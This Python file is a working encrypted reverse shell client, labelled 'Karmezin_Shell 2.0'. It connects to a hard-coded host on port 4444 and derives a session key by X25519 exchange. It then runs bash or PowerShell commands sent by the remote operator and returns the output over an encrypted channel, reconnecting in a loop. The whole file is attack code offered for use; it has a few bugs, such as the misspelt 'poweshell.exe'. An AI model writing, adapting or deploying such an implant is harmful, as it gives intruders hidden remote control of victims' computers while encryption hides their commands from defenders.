
from cryptography.hazmat.primitives.asymmetric.x25519 import X25519PrivateKey, X25519PublicKey
from cryptography.hazmat.primitives.ciphers.aead import ChaCha20Poly1305
from cryptography.hazmat.primitives.kdf.hkdf import HKDF
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives import hashes
import subprocess
import traceback
import platform
import socket
import time
import sys
import os


class TerminalSimulator:

    def __init__(self):
        self.os = platform.system()
        self.host = platform.node()

        if self.os == "Linux":
            self.shell = "/bin/bash"
        elif self.os == "Windows":
            self.shell = "powershell.exe"

        self.encryptation_key = None


def establishing_connection(host, port):
    try:
        client = socket.socket(
            socket.AF_INET,
            socket.SOCK_STREAM,
        )
        client.connect((host, port))
    except Exception:
        sys.exit()
    else:
        return client


def handshake(client, TIMEOUT=20):
    private_key = X25519PrivateKey.generate()
    client.sendall(b"KEY GEN")
    start = time.monotonic()

    try:
        while time.monotonic() - start < TIMEOUT:
            server_confirmation_1 = ""
            buffer_keygen = len(b"KEY GEN")

            while len(server_confirmation_1) < buffer_keygen:
                remaining = TIMEOUT - (time.monotonic() - start)
                client.settimeout(remaining)
                chunk = client.recv(buffer_keygen - len(server_confirmation_1)).decode()
                server_confirmation_1 += chunk

            break

        if server_confirmation_1 != "KEY GEN":
            client.close()
            sys.exit()
    except Exception:
        client.close()
        sys.exit()
    

    public_key = private_key.public_key()
    public_key_bytes = public_key.public_bytes(
        encoding=serialization.Encoding.Raw,
        format=serialization.PublicFormat.Raw,
    )

    client.sendall(b"KEY SND")
    client.sendall(public_key_bytes)
    start = time.monotonic()

    try:
        while time.monotonic() - start < TIMEOUT:
            server_confirmation_2 = ""
            buffer_keyrecv = len(b"KEY RCV")

            while len(server_confirmation_2) < buffer_keyrecv:
                remaining = TIMEOUT - (time.monotonic() - start)
                client.settimeout(remaining)
                chunk = client.recv(buffer_keyrecv - len(server_confirmation_2)).decode()
                server_confirmation_2 += chunk

            break

        if server_confirmation_2 != "KEY RCV":
            client.close()
            sys.exit()

    except Exception:
        client.close()
        sys.exit()

    server_confirmation_3 = ""
    buffer_keysnd = len(b"KEY SND")
    start = time.monotonic()

    try:
        while time.monotonic() - start < TIMEOUT:
            while len(server_confirmation_3) < buffer_keysnd:
                try:
                    remaining = TIMEOUT - (time.monotonic() - start)
                    client.settimeout(remaining)
                    chunk = client.recv(buffer_keysnd - len(server_confirmation_3)).decode()
                    server_confirmation_3 += chunk
                except TimeoutError:
                    client.close()
                    sys.exit()
            break


        if server_confirmation_3 != "KEY SND":
            client.close()
            sys.exit()
    except Exception:
        client.close()
        sys.exit()


    public_key_from_server_bytes = b""
    try:
        while time.monotonic() - start < TIMEOUT:
            while len(public_key_from_server_bytes) < 32:
                try:
                    remaining = TIMEOUT - (time.monotonic() - start)
                    client.settimeout(remaining)
                    chunk = client.recv(32 - len(public_key_from_server_bytes ))
                    public_key_from_server_bytes += chunk
                except TimeoutError:
                    client.close()
                    sys.exit()
            break
        
    except Exception:
        client.close()
        sys.exit()


    public_key_from_server = X25519PublicKey.from_public_bytes(
        public_key_from_server_bytes,
    )
    client.sendall(b"KEY RCV")
    shared_key = private_key.exchange(public_key_from_server)

    final_key = HKDF(
        algorithm=hashes.SHA256(),
        length=32,
        salt=None,
        info=b"encryptation key"
        ).derive(shared_key)

    if len(final_key) != 32:
        raise ValueError("[-]KeySizeInvalid")
    
    return client, final_key

    
def encryptation(data, final_key):
    encryptor = ChaCha20Poly1305(final_key)
    nonce = os.urandom(12)
    AAD = b"Karmezin_Shell 2.0"
    data_encrypted = encryptor.encrypt(nonce, data, AAD)
    return nonce, data_encrypted


def unencryptation(data, final_key, nonce):
    unencryptor = ChaCha20Poly1305(final_key)
    AAD = b"Karmezin_Shell 2.0"
    data_unencrypted = unencryptor.decrypt(nonce, data, AAD)
    return data_unencrypted.decode()


def payload(target:TerminalSimulator, client:socket, BUFFER=4096, TIMEOUT=10):
    try:
        if target.os == "Windows":
            process = subprocess.Popen(
                ["poweshell.exe",
                 "-NoLogo",
                 "-NoProfile",
                 "-Command",
                 "-"
                 ],
                stdin=subprocess.PIPE,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True,
            )

        elif target.os == "Linux":
            process = subprocess.Popen(
                ["/bin/bash"],
                stdin=subprocess.PIPE,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True,
            )

    except Exception as erro:
        print(f"[-]Erro encontrado:{erro}")
        client.close()
        sys.exit()

    while process.poll() is None:
        nonce = b""

        while len(nonce) < 12:
            try:
                chunk = client.recv(12 - len(nonce))
                nonce += chunk

            except socket.timeout:  
                pass


        start = time.monotonic()
        command_encrypted = b""
        while time.monotonic() - start < TIMEOUT:
            try:
                chunk = client.recv(BUFFER)
                if not chunk:
                    break

                elif b"EOF" in chunk:
                    command_encrypted += chunk
                    command_encrypted = command_encrypted.replace(b"EOF", b"")
                    break

                command_encrypted += chunk

            except Exception:
                print(traceback.print_exc())
                break

        if time.monotonic() - start >= TIMEOUT:
            print("[+]Timeout error!")
            return


        command_unencrypted = unencryptation(command_encrypted, target.encryptation_key, nonce)

        if command_unencrypted == "SHELL CLS":
            return

        process.stdin.write(command_unencrypted + "\n")
        process.stdin.flush()

        process.stdin.write("echo EOF\n")
        process.stdin.flush()

        output = ""
        while True:
            line = process.stdout.readline()

            if not line:
                break

            elif "EOF" in line:
                break
            
            output += line


        if len(output) == 0:
            nonce, data_encrypted = encryptation(b"DONE", target.encryptation_key)
            client.sendall(nonce)
            client.sendall(data_encrypted + b"EOF")
            continue

        else:
            nonce, encrypt_output = encryptation(output.encode(), target.encryptation_key)
            client.sendall(nonce)
            client.sendall(encrypt_output + b"EOF")
            continue
            

def main(host, port):
    while True:
        try:
            client = establishing_connection(host, port)
            client, final_key = handshake(client)

            target = TerminalSimulator()
            target.encryptation_key = final_key

            nonce = b""
            client.settimeout(None)
            while len(nonce) < 12:
                try:
                    chunk = client.recv(12 - len(nonce))
                    if not chunk:
                        client.close()
                        break

                    nonce += chunk

                except Exception:
                    sys.exit()


            request_shell_encrypted = b""
            while len(request_shell_encrypted) < 21:
                try:
                    chunk = client.recv(21 - len(request_shell_encrypted))
                    if not chunk:
                        client.close()
                        break

                    request_shell_encrypted += chunk

                except Exception:
                    sys.exit()


            data_decrypted = unencryptation(request_shell_encrypted, final_key, nonce)

            if data_decrypted != "SHELL":
                client.close()
                sys.exit()

            nonce, shell_ack = encryptation(b"SHELL ACK", final_key)
            client.sendall(nonce)
            client.sendall(shell_ack)
            payload(target, client)


        except Exception:
            client.close()
            sys.exit()


if __name__ == "__main__":
    main("10.0.2.15", 4444)
